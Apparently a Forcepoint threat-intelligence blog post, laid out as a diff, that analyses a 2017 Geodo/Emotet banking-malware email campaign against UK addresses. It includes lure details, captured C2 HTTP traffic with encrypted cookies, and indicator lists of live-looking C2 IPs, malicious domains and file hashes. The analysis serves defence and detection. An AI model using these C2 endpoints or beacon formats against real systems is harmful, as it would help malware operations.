@@ -1,0 +1,184 @@
+New variant of Geodo/Emotet banking malware targets UK
+
+Forcepoint Security Labs have recently observed a malicious email campaign delivering what appears to be a new variant of the Geodo/Emotet banking malware, predominantly to .UK TLDs across a range of sectors including addresses at major business and government departments.
+
+Forcepoint Security Labs have recently observed a malicious email campaign delivering what appears to be a new variant of the Geodo/Emotet banking malware, predominantly to .UK TLDs across a range of sectors including addresses at major business and government departments.
+Several prior campaigns have been recorded with researchers noting a progressive evolution in the methods employed by the actors behind the malware: earlier versions were reported delivering the malware as an attachment to fake telephone bills. This then changed to embedding links to malicious files within the emails - the same approach as has been observed in this campaign.
+A Note on Naming
+When the sample analysed in this blog post was discovered it triggered two antivirus signatures identifying it as Emotet - another name for the Geodo malware. Geodo has a lengthy and somewhat complex family tree: Geodo itself was a development of Feodo (AKA Cridex; Bugat) and subsequent variants of Geodo were generally referred to as Dridex. A more complete history is available here: https://feodotracker.abuse.ch/
+Both the malicious email campaign and the malware sample discussed in this post are distinct from the recent Dridex campaigns and bear far more similarity to the older Emotet/Geodo variant. The name Geodo will be used in preference to Emotet throughout the remainder of this post to align with previous Forcepoint Security Labs naming [1] [2].
+Delivery
+The campaign appeared to peak on 18 April 2017 and primarily targeted email addresses associated with .UK TLDs. The subject line of the emails sent varied slightly but the content took the form of a fake billing notification emails. Similar to previously recorded Geodo campaigns this email was formatted using images hosted on the legitimate websites of the companies mimicked. Note the use of what would for most people be an abnormally high billing amount (presumably to further entice the reader to try and 'view the bill') and the inclusion of an overt reference to the link's target being a JS file (presumably to reassure the user about the format of the file returned if they do follow the link).
+
+While the link in the second excerpt shown above purports to be hosted on the website of the provider being mimicked, in reality the link leads to a path on a compromised domain (in this case natchezms[.]us). This underlying link does indeed return a .JS file, heavily obfuscated and apparently seeded with large amounts of 'junk' data:
+
+When run, the next thing the user sees is an error message (shown below).
+
+Upon clicking 'OK' the malware commences its attempts to beacon to its C2 server, where the differences between previous versions and this one become more apparent.
+Earlier versions would send an HTTP POST request containing encrypted data to port 8080 on one of a list of C2 IP addresses. This POST request would be made to a path on the server derived from information about the victim and the malware itself (see below). As previously documented elsewhere [3], the malware would also deliberately call out to incorrect C2 IP addresses if it detected that it was running in a virtual machine.
+
+HTTP Request to C2 (Old Method)
+
+POST /722ffc5e/355c7a0a/ HTTP/1.1
+Accept: /
+User-Agent: Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)
+HOST: 103.215.153.151:8080
+Content-Length: 207
+Connection: Keep-Alive
+Cache-Control: no-cache
+The variant recorded during this campaign uses a markedly different communications method. While it still makes HTTP requests to port 8080 on its C2 IP, this takes the form of a GET request with what is presumably its identification data encrypted within a Base64-encoded Cookie string:
+
+TCP Stream One: HTTP Request to C2 (New Method)
+
+GET / HTTP/1.1
+Cookie: 2324=OpPJoy3z54sAJDD/VcfK6Y60NGclE42VSCItJVZ21v0ePBoQnDGSQqX791ltGL6Dxi26BLoxb6T
+U4t1hPl63fi4SdTrf+fda9M++o0WzZ/ZCPkVEYkOQ5fYay8QeA/wmfz48ribJFoB6VZmrJuNl9FwiR80UYThs6hQ
+Zkqlw8R8JNxJ9tiAnsi3aLeHubIwPFmEc4FmwWn8ecRMKk5eu9nT/ZtHk+U9sjkaN+Lesa9wgReHkyGO+pG0HHxx
+m8W0bameGkuJXH96EfYvPy96mQc+AK577QRsodi6eNTKw4/TX2DOL79ZfGY0K90EcMJMEnAI5CWyrQa5DIAXGUXL
+hsGRfHDZ9dViuiZSo6ycG8ytyMRuRt3uJRN9AluL6LMckWoNFCx4iW2qAomvrL6yEvB9M+qkXxg16vdegS034LkX
+QT8nxkUzbEydEz3SY0REYmeejvVE7wLY03CTORnmmCAKf67uaP+l/ze9GqfHI9WCLya+HfF9ovtdyh/iaWNJ8Dsb
+lh+oiX46I1MTFp3/nNKKJfH5yBGih4r0nHxQFldBO9KvgRSuhR9i1X6jC31Goa+sY7fG9xrBuSHUs7eUl7/BsV2Y
+AAVri5shK64R/a/apvOkiyOUchhwATJg6dBakgod85T2yfZqO6PGInEJF/UIfTOXVahQIoFzjBtyxcY+HBh6aeth
+4Jdd77u7Ui37lIJ4VnVaIsaH+W7l82Tn1f2ijlrg=
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)
+Host: 212.83.166.45:8080
+Connection: Keep-Alive
+Cache-Control: no-cache
+Note: Line breaks have been added within the communications strings for formatting purposes.
+When the malware was successfully run the remote IP address (212.83.166.45 - AS12876; ONLINE S.A.S., FR)  responded with a 404 error header and a significant amount of encrypted data (note the Content-Length value):
+
+TCP Stream One: C2 Response (Header Only)
+
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Thu, 20 Apr 2017 08:27:32 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 261780
+Connection: keep-alive
+A second request/response is then seen between the victim and the same C2. Note the different Cookie string in the request and the differing content length in the server's response, confirming that the reply varies in response to the cookie sent in the HTTP GET request:
+
+TCP Stream Two
+
+GET / HTTP/1.1
+Cookie: B988=iX897Vl2p2XV7dqttUXLN+aMqo80aJU53Gn0joHlEa5k2zzAYmUDBHgW3eJfdLQqRG1mEb7+1jL
+ZWTeCs7W0mvKHJ/KT+F0xI7lGG6GXciaPuUX6WVe0A0k5dThSvq6bwsplr4AP0WdVTC87T/tJv1pskOpSeZyfcIk
+XJzLI18E9KXmDnJTCV8Yv2yZRRLf6+S2lU+3SR1gk4hElDXReOIP2cWirgDPuXJeJJX90lD8S4S9M8zFntgRz4ZS
+gXbSS237rvF7038I0HOhw8ONEnbuAZAtEMG4d6dkP3HfblEt2DZY0iNOVYKGPm0cvCsdAwpz1ij5jaUzsmCde5jV
+R7C6DUeqb3lxuUuI4bysf+iKBUEnDXp964L8G8oPm8b67GEQUL8vxaiYyXjw5/9XJj49zX2wiuaFPGiiV+plm9Hx
+7ymYtYgxJESM/ofc4Wvgd7gJEp99cJLXkibFArsh3e9i475NfrySbiluUZiO5IxWJR/7WtDdZm65U6yx9UsMsv3c
+HGfBOxS5HJP2qpGV+/0lpLdDj8ryXIvPFBJrNjBnvT/hSvy7kTJ8xsz5AGhgQx6Kz/SEdKHLNez7x0pjor0LZuY1
+G1oc8yuOFs8RhWnbypST/DLcr6W/t9HqxF+0rT/q8g/WNuvMdUwQn5BqEJHfwCTs=
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)
+Host: 212.83.166.45:8080
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Thu, 20 Apr 2017 08:28:10 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 728740
+Connection: keep-alive
+
+After this session - by which time the malware has received approximate 1MB of data - the destination IP of the HTTP GET requests changes (87.106.149.74 - AS8560; ONEANDONE-AS, DE) and the responses become shorter, as shown below. Note, once again, the use of an HTTP 404 header. At this stage the malware also appears to switch to using 443/TCP for communications, likely with the intention of better blending-in with traffic.
+
+TCP Stream Three
+
+GET / HTTP/1.1
+Cookie: E95=BJ2cc4+yEQJpxnVe5nBXoDFnkTe62HZaipZ2uhG19r1tUYdOdseOLnrvxRyRQKQ8t5wJJ95He2NM
+lve0CS5fHFhPqNIGNEF/OUEL0MgT2/ZYwX9EzQr7rke6A9dCcWvY2HuDqz8nCuO8b6wnboaoYyjei360Yg8K0p8F
+BL1zwbEkO3KDJnXPbdv5L9thNUx9EtFYfCOsZ2MwK4N4A4/vqzqiHvFXzWvTdqrQFdYgyZnmnBw/
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)
+Host: 87.106.149.74:443
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Thu, 20 Apr 2017 08:28:22 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 132
+Connection: keep-alive
+."..0"P..#M...pT..G...d....M,.....5..~......m...1..y...=;.T..
+.\b...aKq.2QA.. .=..P;....,r...^.....e....h(....@....".......
+..gf=....G
+
+GET / HTTP/1.1
+Cookie: FFD8=Kyz8lfxbfBaFHEaWLNRi37gdlV2GniCVmsJFz1dLeKA4g5VGYpX01+ZLuOauwWX+TTHccDqn3KJ
+P+ZZ/nreXsGSU8aRUPmnkacdoZt0RyRZac4jCZSvY7ioZXUT21hf3mk1LB7iRIPifH+SzwK08sTD4fNJLkbbEIvh
+JwJl2q3cEOJjHhmOfuwOrEVxjZ+RVhJs2nHROFjBHfSxeisSRvmp9jRT98vNTWpRNhRm4NILK986eLAYsgDeMAUG
+t/dwwFqtcL8QO7KtEwclAaBUDQKoapYrJel0W9IvDZRohUHH28RAGQ04YIgJ76qP6UmPub2EMps9VHACZPwlnQl7
+Hn4wv0zM=
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)
+Host: 87.106.149.74:443
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Thu, 20 Apr 2017 08:28:30 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 132
+Connection: keep-alive
+..@.aoAQ../~...)nK..&=M..{._A.a..q...(..=].I.(
+.=>.K,.......f..4+%...2..{..... =.^.-.W.7.z-..=pY
+R........6.....w..V.....B.Q.vc.o..?
+
+GET / HTTP/1.1
+Cookie: C2E=WKUR/ML6jzr2mzftfgrwRh6qYqu5uw1m4QsgRi5HN3bZzBZVUhW3iEJ7FuKJDNjU4Dd4d2dC6it9
+0IrUf1qU3nXbLekezwcfrAm/4JliZUE5GsE1z4X5ZorbtOYP/e8OospU3J5J+AKjxGcoJ8BYZVKDRx8GB5plpazl
+uI0P4B2pCrFkP+/lg2FgSvlYgz2R5YX4Qg==
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)
+Host: 87.106.149.74:443
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Thu, 20 Apr 2017 08:28:33 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 132
+Connection: keep-alive
+![~...3.).-?....dk%....L...;
+....1...].....h...N.3:....*.Jo.i"4F:..
+...U'..T....V...[*g(n~m.....N.'w. ...A....BEW.......A}.
+....G..<.
+A full analysis is still being performed on this version of the malware; however, given the data volumes involved and the fact that Geodo has historically had a modular structure, it seems plausible that the initial IP address is being used to download modules to the victim with the second address providing instruction to the malware once installed.
+Forcepoint Protection Statement
+Forcepoint™ customers are protected against this threat at the following stages of attack:
+Stage 2 (Lure) - Malicious emails are blocked
+Stage 5 (Dropper File) - The related malware components are prevented from being downloaded and/or executed.
+Stage 6 (Call Home) - Connections to C2 servers are blocked.
+Conclusion
+This week's campaign is a reminder that threats can (and do) reappear as suddenly as they disappear: malware authors may voluntarily retreat after a campaign in order to hone and improve their infrastructure and tool-sets. This appears to have been the case with Geodo's dormancy.
+As with many campaigns of this nature the target here is very much the human point, with users being lured into clicking on malicious links by the threat of an outlandish telephone bill.
+Forcepoint Security Labs will continue to monitor this new variant.
+IOCs
+Hashes
+
+SHA1
+d92dd4597ef70ddc4498545f82e2b19055189c71
+
+SHA256
+e5e21fcf2a8147cefdeae11f4b67b142c334607ec3082f08306e8868ebc671a6
+
+Domains
+hxxp://natchezms[.]us
+hxxp://vision2factory[.]com
+hxxp://selosconsultoria[.]com.br
+hxxp://dwpwebsites[.]com
+hxxp://lunaradventures[.]net
+hxxp://seftonplaycouncil[.]org.uk
+hxxp://adfinesterrae[.]com
+hxxp://nlscreative[.]com
+C2 Servers
+212.83.166.45:8080
+119.82.27.246:8080
+194.88.246.7:8080
+85.143.221.180:8080
+188.165.220.214:8080
+87.106.149.74:443
+References
+[1] /blog/security-labs/announcing-websense-security-labs-2015-industry-drill-down-report-financial-services
+[2] /blog/security-labs/today%E2%80%99s-lesson-end-users-education-sector-are-twice-likely-visit-malicious-sites
+[3] https://securelist.com/analysis/publications/69560/the-banking-trojan-emotet-detailed-analysis/
